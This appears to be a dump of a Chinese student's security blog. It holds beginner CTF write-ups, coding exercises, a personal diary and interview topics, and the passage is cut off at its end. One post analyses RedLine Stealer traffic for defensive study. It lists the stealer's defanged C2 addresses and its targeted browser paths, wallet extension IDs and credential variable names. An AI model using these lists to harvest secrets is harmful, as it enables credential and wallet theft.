[{"title":"0xGame2024wp","url":"/posts/2fabe180.html","content":"南邮的新生赛，week1 对于我这种老年痴呆来说还是能做一做。\nReverse[Week 1] BabyBase\nshift+f12 看看，base64，秒了，甚至都没换表\n\n0xGame{N0w_y0u_kn0w_B4se64_Enc0d1ng_w3ll!}\n\n[Week 1] BinaryMaster\nflag 打开就有\n\n0xGame{114514cc-a3a7-4e36-8db1-5f224b776271}\n\n[Week 1] SignSign查看字符串，打开就有\n\n\n0xGame{S1gn1n_h3r3_4nd_b3g1n_Reversing_n0w}\n\n[Week 1] Xor-Beginning一个简单的异或\nv5 = [0] * 30for i in range(len(&quot;~5\\v*&#x27;,3&quot;)):    v5[i] = ord(&quot;~5\\v*&#x27;,3&quot;[i])v5[7] = 31v5[8] = 118v5[9] = 55v5[10] = 27v5[11] = 114v5[12] = 49v5[13] = 30v5[14] = 54v5[15] = 12v5[16] = 76v5[17] = 68v5[18] = 99v5[19] = 114v5[20] = 87v5[21] = 73v5[22] = 8v5[23] = 69v5[24] = 66v5[25] = 1v5[26] = 90v5[27] = 4v5[28] = 19v5[29] = 76print(v5)flag = &quot;&quot;for i in range(len(v5)):    flag += chr(v5[i] ^ (78 - i))print(flag)\n\n[Week 1] Xor-Endian这题也是异或，只不过用得到一些小端序的知识，用 ChatGPT 写的，等有时间再回来研究研究\nimport struct# 定义 v6 数组v6 = [    1363025275,    253370901,    1448151638,    1415391232,    91507463,    139743552,    1450318164,    1985283101,    1465125718,    1934953223,    84430593,    0,]# 将 v6 转换为字节序列（小端序）v6_bytes = b&quot;&quot;.join(struct.pack(&quot;&lt;I&quot;, num) for num in v6)# 只取前 44 个字节v6_bytes = v6_bytes[:44]# 定义密钥key = b&quot;Key0xGame2024&quot;# 加密长度encrypt_len = 44key_len = len(key)  # 13# 反向计算原始的 v7_bytesv7_bytes = bytearray(encrypt_len)for i in range(encrypt_len):    v7_bytes[i] = v6_bytes[i] ^ key[i % key_len]# 输出结果print(&quot;需要输入的字符串为：&quot;)print(v7_bytes.decode(&quot;ascii&quot;))\n\nMisc[Week 1] 关注 DK 盾谢谢喵签到题，不多说了\n\n0xGame{W31c0m3_70_0x64m3_2024_5p0n50r3d_8y_dkdun}\n\n[Week 1] 加密的压缩包?打开之后发现文件损坏，用 bandzip 修复也没成功\n伪加密修复后可以正常解压，输入解压密码 0xGame2024\n拿到 flag\n\n0xGame{M@ybe_y0u_ar2_t4e_mAsTer_0f_Z1p}\n\nWeb[Week 1] ez_login弱口令\nadminadmin123\n\n[Week 1] hello_web根据提示查看源代码\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;查看源代码&lt;/title&gt;    &lt;script&gt;      document.addEventListener(&quot;contextmenu&quot;, function (e) &#123;        alert(&quot;居心叵测，不许查看源代码！&quot;);        e.preventDefault();      &#125;);      document.addEventListener(&quot;keydown&quot;, function (e) &#123;        if (e.key === &quot;F12&quot;) &#123;          alert(&quot;你想干嘛？你不许F12！&quot;);          e.preventDefault();        &#125;      &#125;);    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Welcome to 0xgame 2024&lt;/h1&gt;    &lt;!-- 看看f14g.php --&gt;    &lt;!-- 此乃flag的第一段：0xGame&#123;ee7f2040-1987-4e0a --&gt;    &lt;p&gt;这是一个简洁的网页，web方向的题基本都会有这么一个网站&lt;/p&gt;    &lt;p&gt;零基础的同学不会的地方，可以尝试多搜索一下&lt;/p&gt;  &lt;/body&gt;&lt;/html&gt;\n\n拿到第一段\n根据提示看&#x2F;f14g.php\n查看响应包\n\n\n0xGame{ee7f2040-1987-4e0a-872d-68589c4ab3d3}\n\n[Week 1] hello_http考察 http 协议，用 hackerbar 打就行了，感谢哆啦 A 梦师哥的指导\n\n\n0xgame{1cd6a904-725f-11ef-aafb-d4d8533ec05c}\n\nCrypto[Week 1] Caesar Cipher0yHbnf&#123;Uif_Cfhjoojoh_Pg_Dszqup&#125;\n\n凯撒密码，枚举一下\n\n0xGame{The_Beginning_Of_Crypto}\n\n[Week 1] Codefrom Crypto.Util.number import long_to_bytesfrom base64 import b64decode# 已知的分块信息m0 = b&quot;0xGame&#123;73d7&quot;m1 = 60928972245886112747629873m2 = &quot;3165662d393339332d3034&quot;m3 = b&quot;N2YwZTdjNGRlMX0=&quot;# 逆向解码m1_decoded = long_to_bytes(m1)m2_decoded = bytes.fromhex(m2)m3_decoded = b64decode(m3)# 组合得到完整的 flagflag = m0 + m1_decoded + m2_decoded + m3_decodedprint(flag.decode())\n\nPwn[Week 1] 0. test your ncnc 连上拿到 flag，可能要连两次，第二次才有\n\n0xGame{928bb261-0a63-4389-b629-4d1f2f449848}\n\n","categories":["CTF","WP","0xGame2024"],"tags":["CTF","WP","0xGame2024"]},{"title":"Crossing the Line Unit 42 Wireshark Quiz for RedLine Stealer","url":"/posts/dbf9c8f7.html","content":"Crossing the Line Unit 42 Wireshark Quiz for RedLine StealerQuiz QuestionsWhat is the date and time in UTC the infection started?\n感染开始的 UTC 日期和时间是什么时候？\n感染于 2023 年 7 月 10 日 22：39 UTC 开始。\n\nWhat is the IP address of the infected Windows client?\n受感染的 Windows 客户端的 IP 地址是什么？\n受感染的 Windows 客户端 IP 地址：10.7.10 [.] 47\n\nWhat is the MAC address of the infected Windows client?\n受感染的 Windows 客户端的 MAC 地址是什么？\n受感染的 Windows 客户端 MAC 地址：80：86：5b：ab：1e：c4\n\nWhat is the hostname of the infected Windows client?\n受感染的 Windows 客户端的主机名是什么？\n受感染的 Windows 主机名：DESKTOP-9PEA63H\n\nWhat is the user account name from the infected Windows host?\n受感染的 Windows 主机的用户帐户名称是什么？\n受感染的 Windows 客户端 IP 用户帐户名称：rwalters\n\nWhat type of information did this RedLine Stealer try to steal?\n这个 RedLine Stealer 试图窃取什么类型的信息？\nRedLine 恶意软件试图窃取的信息：\n受害者桌面上的各种类型的文件\n受害者的“文档”文件夹中的各种类型的文件\nChrome、Chromium、Edge、Opera、Vivaldi 和其他各种网络浏览器的用户数据\n各种加密货币钱包的数据和这些加密货币钱包的浏览器插件\n来自其他应用程序的 API 密钥和登录凭据\n\n\n\nAnswerPcap 分析：受害者详细信息\n感染于 2023 年 7 月 10 日 22：39 UTC 开始。\n\n确定受感染者的 IP 地址和 MAC 地址\n通过筛选 nbns 确定受害者主机名\n\n\n通过 Kerberos 身份验证流量验证受害者的主机名和 Windows 用户帐户名。筛选 kerberos.CNameString 查找 Windows 用户帐户名 rwalters\n\nPcap 分析：恶意 Web 流量利用 (http.request or tls.handshake.type eq 1) and !(ssdp) 过滤出 Web 流量\n发现三个未加密的 HTTP GET 请求\n\n追踪 623start [.] 的任一流量\n\nTCP 流显示可能的 PowerShell 生成的流量。\n虽然 User-Agent 字符串可能被恶意软件或 Web 浏览器扩展欺骗，但 User-Agent 行中的 WindowsPowerShell 是一个可靠的指示器，表明此流量是由 PowerShell 脚本生成的。这两个 HTTP GET 请求的 URL 是：\n\nhxxp:&#x2F;&#x2F;623start [.] site&#x2F;?status &#x3D; start&amp;av &#x3D; Windows%20Defender\nhxxp:&#x2F;&#x2F;623start [.] site&#x2F;?status &#x3D; install\n\n这些请求都从服务器返回了 404 HTTP 错误。第一个 HTTP 请求报告了受害主机上使用的防病毒软件。在这种情况下，av &#x3D; Windows%20Defender 指示 Windows Defender 是防病毒软件。第二个 URL 报告此恶意软件的安装状态。\n最后一个未加密的 HTTP GET 请求是 hxxp:&#x2F;&#x2F;guiatelefonos [.] com&#x2F;data&#x2F;czx.jpg 中。遵循此 GET 请求的 TCP 流。TCP 流显示此 URL 重定向到同一 URL 的 HTTPS 版本\n\nhttp URL 到 guiatelefonos [.] com 重定向到 HTTPS URL。\nhxxps://guiatelefonos [.] com/data/czx.jpg\nPcap 分析：RedLine Stealer 数据泄露使用下面命令过滤\ntcp.flags eq 0x0002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst eq 10.7.10.0/24)\n此筛选器搜索表示 TCP 流开头的 TCP SYN 段。搜索将排除通过 TCP 端口 80 和 TCP 端口 443 的任何 Web 流量。此筛选器还会排除从此 AD 环境发送到内部 IP 地址的任何 SYN 段。结果显示发送到 194.26.135 的单个 TCP SYN 段 [.] 119 通过 TCP 端口 12432\n\n来自 TCP 流的初始字符串包括 tcp:&#x2F;&#x2F;194.26.135 [.] 处的 C2 通道。119：12432&#x2F; 和使用 tempuri [.] 的 URL 组织。术语“tempuri”是“临时 URI”的缩写，域 tempuri [.] org 是 Microsoft 开发工具（如 Visual Studio）中使用的占位符命名空间 URI。在我们的 RedLine Stealer 感染的任何其他流量中均未看到此 tempuri 域。\n选择从服务器发送到受感染的 Windows 主机的数据\n\n下图突出显示了这种感染在受害者的用户配置文件下寻找的数据。\n\n该列表包括受害者桌面和受害者的“文档”文件夹上的通配符搜索。这包括文本文件、Word 文档和加密货币钱包文件，如下所示。\n\n%userprofile%\\Desktop|.txt，.doc ， key ， wallet ， seed*|0\n%userprofile%\\Documents|.txt，.doc ， key ， wallet ， seed*|0\n\n然后，该列表根据受害者在其用户配置文件中受害者的 AppData 目录下的预期位置指示来自不同应用程序的数据。该列表按字母顺序显示在下面。\n\n%USERPROFILE%\\AppData\\Local\\360Browser\\Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\7Star\\7Star\\User Data\n%USERPROFILE%\\AppData\\Local\\Amigo\\User\\User Data\n%USERPROFILE%\\AppData\\Local\\Battle.net\n%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data\n%USERPROFILE%\\AppData\\Local\\CentBrowser\\User Data\n%USERPROFILE%\\AppData\\Local\\Chedot\\User Data\n%USERPROFILE%\\AppData\\Local\\Chromium\\User Data\n%USERPROFILE%\\AppData\\Local\\Chromodo\\User Data\n%USERPROFILE%\\AppData\\Local\\CocCoc\\Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\Comodo\\Dragon\\User Data\n%USERPROFILE%\\AppData\\Local\\Comodo\\User Data\n%USERPROFILE%\\AppData\\Local\\Coowon\\Coowon\\User Data\n%USERPROFILE%\\AppData\\Local\\CryptoTab Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\Elements Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\Epic Privacy Browser\\User Data\n%USERPROFILE%\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\n%USERPROFILE%\\AppData\\Local\\Google(x86)\\Chrome\\User Data\n%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\n%USERPROFILE%\\AppData\\Local\\Iridium\\User Data\n%USERPROFILE%\\AppData\\Local\\K-Melon\\User Data\n%USERPROFILE%\\AppData\\Local\\Kometa\\User Data\n%USERPROFILE%\\AppData\\Local\\liebao\\User Data\n%USERPROFILE%\\AppData\\Local\\Mail.Ru\\Atom\\User Data\n%USERPROFILE%\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data\n%USERPROFILE%\\AppData\\Local\\Maxthon3\\User Data\n%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\n%USERPROFILE%\\AppData\\Local\\Nichrome\\User Data\n%USERPROFILE%\\AppData\\Local\\NVIDIA Corporation\\NVIDIA GeForce Experience\n%USERPROFILE%\\AppData\\Local\\Orbitum\\User Data\n%USERPROFILE%\\AppData\\Local\\QIP Surf\\User Data\n%USERPROFILE%\\AppData\\Local\\Sputnik\\Sputnik\\User Data\n%USERPROFILE%\\AppData\\Local\\Steam\n%USERPROFILE%\\AppData\\Local\\Torch\\User Data\n%USERPROFILE%\\AppData\\Local\\uCozMedia\\Uran\\User Data\n%USERPROFILE%\\AppData\\Local\\Uran\\User Data\n%USERPROFILE%\\AppData\\Local\\Vivaldi\\User Data\n%USERPROFILE%\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\n%USERPROFILE%\\AppData\\Roaming\\8pecxstudios\\Cyberfox\n%USERPROFILE%\\AppData\\Roaming\\Comodo\\IceDragon\n%USERPROFILE%\\AppData\\Roaming\\K-Meleon\n%USERPROFILE%\\AppData\\Roaming\\Moonchild Productions\\Pale Moon\n%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\n%USERPROFILE%\\AppData\\Roaming\\NETGATE Technologies\\BlackHaw\n%USERPROFILE%\\AppData\\Roaming\\Opera Software\\\n%USERPROFILE%\\AppData\\Roaming\\Thunderbird\n%USERPROFILE%\\AppData\\Roaming\\Waterfox\n\n再往下滚动一点，我们发现似乎是这种感染寻找的各种加密货币钱包，如下图 11 所示。这些数据包括基于 Chromium 的 Web 浏览器（如 Google Chrome 和 Microsoft Edge）使用的扩展程序的标识符。\n\n下面列出了这些加密货币钱包浏览器扩展，按钱包名称的字母顺序排序。（阅读：基于 Chromium 的扩展字符串|扩展名称。\n\nfhilaheimglignddkjgofkcbgekhenbh|AtomicWallet\nfhbohimaelbohpjbbldcngcnapndodjp|BinanceChain\nfihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet\naodkkagnadcbobfpggfnjeongemjbjca|BoltX\nodbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet\naeachknmefphepccionboohckonoeemg|Coin98Wallet\nhnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase\nblnieiiffboillknjnepogjhkgnoapac|EqualWallet\nhpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet\nnanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet\nfnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet\nkncchdigobghenbbaddojjnnaogfppfj|iWallet\ncjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty\npdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain\nkpfopkelmapcoipemfendmdcghnegimn|LiqualityWallet\ndngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet\nafbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet\nnkbihfbeogaeaoehlefnkodbefgpgknn|Metamask\nnlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx\nlpfcbjknijpeeillifnkikgncikgfhdo|NamiWallet\njbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet\nfhilaheimglignddkjgofkcbgekhenbh|Oxygen\nmgffkfbidihjpoaomajlbgchddlicgpn|PaliWallet\nbfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom\nfnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet\nnkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet\naiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation\ncgeeodpfagjceefieflmdfphplkenlfk|TonCrystal\nibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink\namkmjjmmflddogmhpjloimipbofnfjih|Wombat\nhmeobnfnfcmdkdcmlblgagmfpfboieaf|XdefiWallet\nffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet\n\n滚动到流的末尾，我们发现此感染会搜索可能安装在主机上的其他程序的 API 密钥和登录数据\n\n此列表包括各种云平台、社交媒体应用程序和其他工具。下面是按字母顺序排序的列表。\n\nALGOLIA_API_KEY\nAMAZON_AWS_ACCESS_KEY_ID\nAMAZON_AWS_SECRET_ACCESS_KEY\nAWS_ACCESS_KEY_ID\nAWS_SECRET_ACCESS_KEY\nAZURE_CLIENT_ID\nAZURE_CLIENT_SECRET\nAZURE_PASSWORD\nAZURE_USERNAME\nbinance_api\nbinance_secret\nBITTREX_API_KEY\nBITTREX_API_SECRET\nCF_PASSWORD\nCF_USERNAME\nCI_DEPLOY_PASSWORD\nCI_DEPLOY_PASSWORD\nCI_DEPLOY_USER\nCI_DEPLOY_USER\nCI_JOB_JWT\nCI_JOB_JWT_V2\nCI_JOB_TOKEN\nCIRCLE_TOKEN\nCODECLIMATE_REPO_TOKEN\nCONSUMER_KEY\nCONSUMER_SECRET\nCOVERALLS_REPO_TOKEN\nDIGITALOCEAN_ACCESS_TOKEN\nDOCKER_EMAIL\nDOCKER_PASSWORD\nDOCKER_USERNAME\nDOCKERHUB_PASSWORD\nFACEBOOK_ACCESS_TOKEN\nFACEBOOK_APP_ID\nFACEBOOK_APP_SECRET\nFIREBASE_TOKEN\nFOSSA_API_KEY\nGH_ENTERPRISE_TOKEN\nGH_TOKEN\nGITLAB_USER_LOGIN\nGOOGLE_API_KEY\nGOOGLE_APPLICATION_CREDENTIALS\nHEROKU_API_KEY\nHEROKU_API_USER\nMAILGUN_API_KEY\nMCLI_PRIVATE_API_KEY\nMCLI_PUBLIC_API_KEY\nMSI_ENDPOINT\nMSI_SECRET\nNGROK_AUTH_TOKEN\nNGROK_TOKEN\nNPM_AUTH_TOKEN\nOKTA_AUTHN_GROUPID\nOKTA_CLIENT_ORGURL\nOKTA_CLIENT_TOKEN\nOKTA_OAUTH2_CLIENTID\nOKTA_OAUTH2_CLIENTSECRET\nOS_PASSWORD\nOS_USERNAME\nPERCY_TOKEN\nSAUCE_ACCESS_KEY\nSAUCE_USERNAME\nSENTRY_AUTH_TOKEN\nSLACK_TOKEN\nsquare_access_token\nsquare_oauth_secret\nSTRIPE_API_KEY\nSTRIPE_DEVICE_NAME\nSURGE_LOGIN\nSURGE_TOKEN\nTOKEN\nTRAVIS_OS_NAME\nTRAVIS_SECURE_ENV_VARS\nTRAVIS_SUDO\nTWILIO_ACCOUNT_SID\nVAULT_CLIENT_KEY\nVAULT_TOKEN\nVULTR_ACCESS\nVULTR_SECRET\n\n接下来，切换 TCP 流窗口以查看从受感染主机发送到服务器的数据。这揭示了受感染受害者的 Windows 桌面的屏幕截图已发送到 C2 服务器的迹象\n\n转换成原始数据保存，使用十六进制编辑器删除 png 图像开始之前的内容\n\n拿到图片\n\n屏幕截图显示了一个 PowerShell 窗口，其中包含来自 Web 流量连接的数据。\n查看映像后，返回 TCP 流 （tcp.stream eq 71），将其作为 ASCII 数据查看，然后选择仅从受感染的 Windows 主机到 C2 服务器的流量。滚动到末尾以查看发送到 C2 服务器的其他数据。\n更多地了解受感染的 Windows 主机将有助于我们更好地了解这些数据。受感染的 Windows 主机是最小安装，它只有一组登录凭据存储在 Microsoft Edge 浏览器中。主机在用户的“文档”文件夹中只存储了一个 Word 文档。该文件被命名为 Top_secret_ducment.docx。\n在这个 TCP 流的末尾，我们找到了正在运行的进程列表，如下图 17 所示。我们还可以从受感染的主机中找到硬件信息，从 Edge 浏览器找到登录凭据，以及名为 Top_secret_ducment.docx 的文件。\n\n正在运行的进程、硬件信息、登录凭据和 Word 文档从受感染的 Windows 主机泄露。\n运行进程列表还显示了 powershell.exe 运行 C：\\Users\\rwalters\\Documents\\mystery_file.ps1 文件的进程。该 .ps1 文件生成了此 Wireshark 测验的感染流量。\n","categories":["流量分析"],"tags":["流量分析"]},{"title":"记录我的2023年","url":"/posts/32e2a4f7.html","content":"简单记录自己的 2023 年\n看到朋友圈都在晒，也一直想记录一下自己的 2023 年，想不到有什么好的方法，看到康哥用博客记录，我也跟风写一下吧。\n非常庆幸自己有一本大厚日记本，不如真不知道怎么写这篇博文\n截止目前日记本已经写完三个本子了，记忆里大概是从高一下学期开始写一直到现在（虽然最近一个月没写，大抵是没空了）\n 呼呼光这一篇就写了快一个小时 \n\n\n孟春之月（一月）翻开日记发现竟然没有 1 月，那 1 月我到底干了些什么呢，打开相册回忆一下。\n原因竟然是 疫情！1 月大概是大一上学期刚放寒假，那时候还在疫情时代，大家都阳了没什么好写的。\n\n仲春之月（二月）大一上初识 CTF，但是也没什么入门，一直处在门外边的水平\n整个寒假算是我 CTF 学习阶段进步比较大的一段时间，用一个寒假来入了一下门，知道了什么是编码，什么是 IDA，什么是加壳脱壳……\n放一波刷题记录\n大概是从 2 月开始跑步减肥的（虽然只减了十几斤，而且现在已经吃回来了）\n\n    \n        \n         Caption for Image 1 \n    \n    \n        \n         Caption for Image 2 \n    \n\n\n一入网安深似海，从此 hacker 不能改\n从小一个黑客梦，还是想感叹  高考能考到自己喜欢的专业是多么幸福的一件事 \n季春之月（三月）三月就已经开学上课了，一开始听课还能听点，结果是越来越不听了吧\n三月的时候还挺爱打羽毛球的，现在怎么不打了\n三月学院 班歌比赛，负责剪辑班歌视频，嘻嘻，荣获一等奖，当时还跟朋友们拍了一张合影（照片里面现在貌似只剩我没对象了 hhhhh）\n\n孟夏之月（四月）四月发生的印象最深的事情就是烫了个发吧，当时还觉得蛮好看的\n现在已经剪没了，也没再继续烫。\n\n仲夏之月（五月）四月五月是打扮自己最多的几个月（大概是受食人鱼的指点了吧 🤔 不过也确实学到点东西）\n跟好鸽们打电话时候的正规军。\n\n在毕业晚会幕后道具工作\n\n    \n        \n         毕业晚会门票 \n    \n    \n        \n         毕业晚会幕后 \n    \n\n\n5 月 20 号简历设计大赛二等奖  证书  发下来了\n5 月 30 号，二阳了\n季夏之月（六月）这个月一开始看了历史文化学院的最美汉服代言人表演，太惊艳了，全是戏曲\n\n上课看完了深海哈哈哈哈，物理课不听课看电影，挺有教育意义的一部动画电影\n\n填了积极分子相关资料\n在百佳宿舍评选幕后，也是这时候认识了 myk 师哥\n\n献血最光荣嘻嘻，我不在意最后这一袋血会拿去干什么，至于他是否被卖掉或者被浪费，我不关心，但行好事莫问前程\n\n月末放暑假假回家咯\n\n讲真的，这次回家是为了考驾照，如果不是为了考驾照，我是真的想留校学习的，毕竟还有很多东西要学。\n孟秋之月（七月）考驾照的第一个月，下半身没做防晒，从脚踝开始上面是黑的下面是白的，已经是泾渭分明了\n\n好在科一到科四都一把过，科二满分，驾照到手，也算没白费\n仲秋之月（八月）8 月多久已经快开学了，我实在是在家待不住了，提前返校学一会，不得不说，一个人是真的舒服\n见证了日本核污水不负责任排放大海\n\n8 月 23 一次突发奇想，做了大学时代的第一个面向全校的公益项目（也不能说是项目）——曲阜师范大学选课指北，旨在帮助大家选择合适的任课老师\n目前已经有 120+参与贡献者，浏览量 4w+\n\n季秋之月（九月）九月迎新，大一新生开学了，也是又老了一年，接了两个师弟。\n然后紧张激烈的纳新也开始了，出席了社团管理部的宣讲，网络空间安全协会的宣讲，还有有关于逆向等方面的知识（虽然我也很菜）\n孟冬之月（十月）十月一回来之后就长胖了，再也没减下去\n认识了几个大一的师弟师妹，都挺好的，好学又调皮可爱\n然后就是去山东警察学院打了省赛，跟着师哥去打了科来杯，人生第一次线下赛，总体体验还是学到很多东西的，特别是让我明白人外有人，自己永远是菜狗\n科来杯心得\n\n\n仲冬之月（十一月）十一月在迎新晚会幕后主持道具组\n参加了技能兴鲁网络安全技能挑战赛\n\n\n好大儿送的一本刑法，旨在叫我好好遵守网络安全法，将来做一个白帽子不要误入歧途\n\n季冬之月（十二月）已经沦为卷比的形状了捏 😭😭😭😭😭😭\n","categories":["随笔"],"tags":["W1ndys年度总结","随笔"]},{"title":"2024山东省网络安全技能大赛九州信泰杯wp","url":"/posts/36d0dbb.html","content":"一直没空写，忙完再说吧\n"},{"title":"2024年4月12日HW面试被拷打","url":"/posts/8aed0b1c.html","content":"2024 年 4 月 12 日 HW 面试被拷打下午开始面试\n首先进腾讯会议，要开视频，首先就被点了，看简历说没什么和安全有关的。\n面试过程首先进腾讯会议，开摄像头\n大约问了下面问题\n\n年龄\n是大学生吗，有没有毕业\n冰蝎的特征、默认密码\n查找数据表的命令\n提权\n溯源\n应急响应\n如果 shell 没有回显怎么办\n内存马\nSQL 注入\nSQLmap\n什么是 CSRF 攻击\nCSRF 漏洞和 SSRF 漏洞的区别\n什么是 XSS 漏洞\n什么是 XXE 漏洞\nSSRF 漏洞\n什么是 Webshell，被上传到服务器怎么办\nJava 反序列化漏洞\n\n薪资，工作地点\n大概是寄了\n","categories":["HW"],"tags":["HW"]},{"title":"2024年4月12日蓝桥刷题","url":"/posts/8664db3c.html","content":"2024 年 4 月 12 日蓝桥刷题最后一天了，突击一下\n\n计算 2 的幂题目描述给定非负整数 $n$，求 $2^n$ 的值。\n输入格式一个整数 $n$。$0\\le n&lt;31$。\n输出格式一个整数，即 $2$ 的 $n$ 次方。\n请注意，如果您正在使用 cout 进行输出，您需要关注被输出的数据的类型。输出格式不符合预期可能会造成答案错误。\n常用函数的返回值类型可以在 cppreference.com 和 cplusplus.com 查询到。例如，您可以在这两个网站中查到 pow 函数的返回值是 float 或 double。\n您可以使用显式或隐式的类型转换，来变换数据类型。\n样例 #1样例输入 #13\n\n样例输出 #18\n\n题解n = int(input())print(2\\*\\*n)\n\n解释没啥好说的，简单题自己安慰自己\n含 k 个 3 的数题目描述输入两个正整数 $m$ 和 $k$，其中 $1 \\lt m \\leq 10^{15}$，$1 \\lt k \\leq 15$ ，判断 $m$ 是否恰好含有 $k$ 个 $3$，如果满足条件，则输出 YES，否则，输出 NO。\n输入格式输入一行，为两个整数 $m,k$，中间用单个空格间隔。\n输出格式满足条件，则输出 YES，否则，输出 NO。\n样例 #1样例输入 #143833 3\n\n样例输出 #1YES\n\n题解m, k = map(int, input().split())m = str(m)count = 0for i in range(len(m)):    if m[i] == &quot;3&quot;:        count += 1if count == k:    print(&quot;YES&quot;)else:    print(&quot;NO&quot;)\n\n解释先将 $m$ 转换为字符串，然后遍历字符串，统计 $3$ 的个数，如果个数等于 $k$，则输出 YES，否则，输出 NO。\n[NOIP2011 普及组] 数字反转题目描述给定一个整数 $N$，请将该数各个位上数字反转得到一个新数。新数也应满足整数的常见形式，即除非给定的原数为零，否则反转后得到的新数的最高位数字不应为零（参见样例 2）。\n输入格式一个整数 $N$。\n输出格式一个整数，表示反转后的新数。\n样例 #1样例输入 #1123\n\n样例输出 #1321\n\n样例 #2样例输入 #2-380\n\n样例输出 #2-83\n\n提示【数据范围】\n$-1,000,000,000\\leq N\\leq 1,000,000,000 $。\nnoip2011 普及组第一题\n题解n = int(input())if n &lt; 0:    n = -n    n = int(str(n)[::-1])    n = -nelse:    n = int(str(n)[::-1])print(n)\n\n解释先判断 $n$ 是否为负数，如果是负数，则先取绝对值，再反转，最后再取负值。如果 $n$ 为正数，则直接反转。\n\n这题有个有意思的点就是，切片操作，直接用切片翻转字符串，然后再转换回整数，可以得到正确的结果。\n\n小鱼的数字游戏题目描述小鱼最近被要求参加一个数字游戏，要求它把看到的一串数字 $a_i$（长度不一定，以 $0$ 结束），记住了然后反着念出来（表示结束的数字 $0$ 就不要念出来了）。这对小鱼的那点记忆力来说实在是太难了，你也不想想小鱼的整个脑袋才多大，其中一部分还是好吃的肉！所以请你帮小鱼编程解决这个问题。\n输入格式一行内输入一串整数，以 $0$ 结束，以空格间隔。\n输出格式一行内倒着输出这一串整数，以空格间隔。\n样例 #1样例输入 #13 65 23 5 34 1 30 0\n\n样例输出 #130 1 34 5 23 65 3\n\n提示数据规模与约定对于 $100%$ 的数据，保证 $0 \\leq a_i \\leq 2^{31} - 1$，数字个数不超过 $100$。\n题解a = list(map(int, input().split()))for i in range(len(a)):    if a[len(a) - 1 - i] == 0:        continue    print(a[len(a) - 1 - i], end=&quot; &quot;)\n\n解释先将输入的数字列表 a 倒序，然后遍历列表，如果当前数字不为 $0$，则输出该数字，否则，跳过该数字。\n小玉买文具题目描述班主任给小玉一个任务，到文具店里买尽量多的签字笔。已知一只签字笔的价格是 $1$ 元 $9$ 角，而班主任给小玉的钱是 $a$ 元 $b$ 角，小玉想知道，她最多能买多少只签字笔呢。\n输入格式输入只有一行两个整数，分别表示 $a$ 和 $b$。\n输出格式输出一行一个整数，表示小玉最多能买多少只签字笔。\n样例 #1样例输入 #110 3\n\n样例输出 #15\n\n提示数据规模与约定对于全部的测试点，保证 $0 \\leq a \\leq 10^4$，$0 \\leq b \\leq 9$。\n题解expensive_paper = 1.9a, b = map(int, input().split())money = a + b * 0.1print(int(money / expensive_paper))\n\n解释首先，我们知道一只签字笔的价格是 $1$ 元 $9$ 角，所以我们可以计算出小玉的钱可以买多少只签字笔。\n\n这边需要复习一下小数点后精确的知识点\n\n小玉家的电费题目描述夏天到了，各家各户的用电量都增加了许多，相应的电费也交的更多了。小玉家今天收到了一份电费通知单。小玉看到上面写：据闽价电 [2006]27 号规定，月用电量在 $150$ 千瓦时及以下部分按每千瓦时 $0.4463$ 元执行，月用电量在 $151\\sim 400$ 千瓦时的部分按每千瓦时 $0.4663$ 元执行，月用电量在 $401$ 千瓦时及以上部分按每千瓦时 $0.5663$ 元执行;小玉想自己验证一下，电费通知单上应交电费的数目到底是否正确呢。请编写一个程序，已知用电总计，根据电价规定，计算出应交的电费应该是多少。\n输入格式输入一个正整数，表示用电总计（单位以千瓦时计），不超过 $10000$。\n输出格式输出一个数，保留到小数点后 $1$ 位（单位以元计，保留到小数点后 $1$ 位）。\n样例 #1样例输入 #1267\n\n样例输出 #1121.5\n\n题解n = int(input())money = 0if n &lt;= 150:    money = n * 0.4463elif n &lt;= 400 and n &gt; 150:    money = 150 * 0.4463 + (n - 150) * 0.4663elif n &gt; 400:    money = 150 * 0.4463 + (400 - 150) * 0.4663 + (n - 400) * 0.5663print(&quot;%.1f&quot; % money)\n\n解释首先，我们先判断用电量是否在 $150$ 千瓦时及以下部分，如果在，则按每千瓦时 $0.4463$ 元执行，如果不在，则判断用电量是否在 $151\\sim 400$ 千瓦时的部分，如果在，则按每千瓦时 $0.4663$ 元执行，如果不在，则判断用电量是否在 $401$ 千瓦时及以上部分，如果在，则按每千瓦时 $0.5663$ 元执行。\n然后，我们计算出应交的电费，保留到小数点后 $1$ 位。\n小玉在游泳题目描述小玉开心的在游泳，可是她很快难过的发现，自己的力气不够，游泳好累哦。已知小玉第一步能游 $2$ 米，可是随着越来越累，力气越来越小，她接下来的每一步都只能游出上一步距离的 $98%$。现在小玉想知道，如果要游到距离 $s$ 